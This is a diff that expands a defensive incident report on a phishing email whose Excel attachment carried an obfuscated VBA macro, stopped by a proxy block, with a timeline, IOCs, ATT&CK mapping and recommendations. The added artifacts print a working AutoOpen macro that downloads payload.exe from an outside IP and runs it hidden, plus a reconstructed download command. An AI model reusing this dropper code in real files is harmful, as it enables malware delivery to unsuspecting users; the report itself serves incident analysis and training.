@@ -1,11 +1,13 @@
-# 🛡 Phishing Email with Malicious Attachment
+🛡 Phishing Email with Malicious Attachment (Anonymized)
+📌 Executive Summary
 
-## 📌 Executive Summary
-A user reported a suspicious email with an attached Excel file. The file contained an obfuscated macro that attempted to download a remote payload. The payload was blocked by the proxy, preventing further compromise.
+A user reported a suspicious email with an attached Excel file.
+The file contained an obfuscated VBA macro that attempted to download a remote payload.
+The payload download was blocked by the corporate proxy, preventing further compromise.
 
-**🎯 Outcome:** early user report + proxy block stopped attack before execution.
+🎯 Outcome: early user report + proxy block stopped attack before execution.
 
----
+___________________________________________________________________________________________________________________________________________________
 
 ## 🖼 Attack Flow (ASCII Diagram)
 
@@ -37,39 +39,170 @@ A user reported a suspicious email with an attached Excel file. The file contain
 | Awareness Training        |
 +---------------------------+
 
----
+___________________________________________________________________________________________________________________________________________________
 
-## ⏱ Timeline (UTC)
-- 14:12 – User reports suspicious email to SOC.  
-- 14:20 – Email headers analyzed; phishing confirmed.  
-- 14:32 – Sandbox detonation shows macro attempt.  
-- 14:35 – Proxy logs confirm block of outbound IP.  
-- 15:00 – User re-educated; IOC shared with mail gateway.  
+📖 Attack Narrative
 
----
 
-## 🔑 Key Findings
-- Obfuscated VBA macro attempting payload download.  
-- Payload domain flagged in TI feeds.  
-- No lateral movement observed.  
+📨 Stage 1 – Delivery
 
----
+External email delivered to user inbox with Excel attachment (Invoice_Q3.xlsm).
 
-## 🗂️ MITRE ATT&CK Mapping
-- **T1566.001 – Spearphishing Attachment**  
-- **T1204 – User Execution**  
-- **T1105 – Ingress Tool Transfer**  
+Sender spoofed a trusted vendor domain.
 
----
 
-## 👀 Detection Use Cases
-- Alert on Office files with macros from external senders.  
-- Detect HTTP requests to uncommon ports/domains.  
-- Cross-check attachment hashes in TI feeds.  
+🧑‍💻 Stage 2 – Execution Attempt
 
----
+User opened file, was prompted to enable macros.
 
-## 🛡️ Recommendations
-- Block Office macros by default.  
-- Train users to escalate suspicious emails.  
-- Improve mail filtering for common phishing lures.  
+Obfuscated VBA macro triggered.
+
+
+🌐 Stage 3 – Payload Retrieval Attempt
+
+Macro attempted URLDownloadToFileA → download payload.exe from hxxp://185.199.111.25/update/payload.exe.
+
+Proxy blocked HTTP connection.
+
+
+🛡 Stage 4 – Containment
+
+SOC analyzed headers and sandbox results.
+
+IOC shared to mail gateway, user provided phishing awareness refresher.
+
+___________________________________________________________________________________________________________________________________________________
+
+
+⏱ Timeline (UTC)
+
+
+| Time  | Event                                                 |
+| ----- | ----------------------------------------------------- |
+| 14:12 | 📨 User reports suspicious email to SOC               |
+| 14:20 | 🔎 Email headers analyzed; spoof confirmed            |
+| 14:32 | 🧪 Sandbox detonation shows VBA macro w/ HTTP request |
+| 14:35 | 🛡 Proxy logs confirm block of outbound IP             |
+| 15:00 | 📚 User re-educated; IOC shared with mail gateway     |
+
+___________________________________________________________________________________________________________________________________________________
+
+📂 Artifacts (Synthetic / Anonymized)
+
+Email Header Snippet:
+
+Received: from mail.fakevendor.com (185.199.111.25)
+From: "Accounts Payable" <billing@fakevendor.com>
+To: user@company.org
+Subject: Invoice Q3 Review
+Attachment: Invoice_Q3.xlsm
+
+Sandbox Extracted VBA (Deobfuscated):
+
+Sub AutoOpen()
+  URL = "http://185.199.111.25/update/payload.exe"
+  Target = Environ("TEMP") & "\payload.exe"
+  URLDownloadToFileA 0, URL, Target, 0, 0
+  Shell Target, vbHide
+End Sub
+
+
+Proxy Log (Blocked Connection):
+
+{
+  "time": "2025-07-11T14:35:02Z",
+  "user": "user@company.org",
+  "srcIP": "10.10.45.33",
+  "dstIP": "185.199.111.25",
+  "url": "http://185.199.111.25/update/payload.exe",
+  "action": "BLOCK",
+  "reason": "Malicious site (TI feed)"
+}
+
+___________________________________________________________________________________________________________________________________________________
+
+
+💻 Attacker Technique (Reconstructed)
+
+# Macro executed (VBA API call)
+URLDownloadToFileA http://185.199.111.25/update/payload.exe C:\Users\user\AppData\Temp\payload.exe
+
+# Attempted execution (blocked)
+payload.exe
+
+___________________________________________________________________________________________________________________________________________________
+
+
+🧾 IOCs (Synthetic)
+
+
+| Type      | Value                                                   | Source           | Status    |
+| --------- | ------------------------------------------------------- | ---------------- | --------- |
+| 🌐 IP     | 185.199.111.25                                          | Proxy logs       | Malicious |
+| 📧 Email  | [billing@fakevendor.com](mailto:billing@fakevendor.com) | Email header     | Spoofed   |
+| 📎 File   | Invoice\_Q3.xlsm (SHA256: a1b2c3…)                      | Sandbox detonate | Malicious |
+| 🛠 Binary | payload.exe (downloaded attempt)                        | Macro code       | Blocked   |
+| 🌐 URL    | hxxp\://185.199.111.25/update/payload.exe               | VBA macro        | Malicious |
+
+___________________________________________________________________________________________________________________________________________________
+
+
+🔑 Key Findings
+
+📎 Excel file with malicious macro.
+
+🧩 Macro used URLDownloadToFileA to fetch payload.
+
+🌐 Payload server already listed in TI feeds.
+
+🛡 Proxy blocked the connection → no host compromise.
+
+___________________________________________________________________________________________________________________________________________________
+
+
+🗂️ MITRE ATT&CK Mapping
+
+T1566.001 – Spearphishing Attachment
+
+T1204 – User Execution
+
+T1105 – Ingress Tool Transfer
+
+___________________________________________________________________________________________________________________________________________________
+
+
+👀 Detection Use Cases
+
+🚨 Alert on Office files with macros from external senders.
+
+🚨 Detect HTTP requests to suspicious IPs/domains.
+
+🧩 Match attachment hashes against TI feeds.
+
+🚨 Alert on execution of Office child-processes spawning cmd.exe / powershell.exe.
+
+___________________________________________________________________________________________________________________________________________________
+
+
+🛡️ Response Actions
+
+❌ Quarantined email and attachment.
+
+🛡 Blocked domain/IP on proxy & mail gateway.
+
+📑 Shared IOC with wider detection team.
+
+📚 User awareness training reinforced.
+
+___________________________________________________________________________________________________________________________________________________
+
+
+🛡️ Recommendations
+
+🔒 Block Office macros by default.
+
+📧 Improve mail filtering with SPF/DKIM/DMARC.
+
+🚨 Integrate TI feeds into mail and web filtering.
+
+📚 Ongoing phishing simulation & user training.
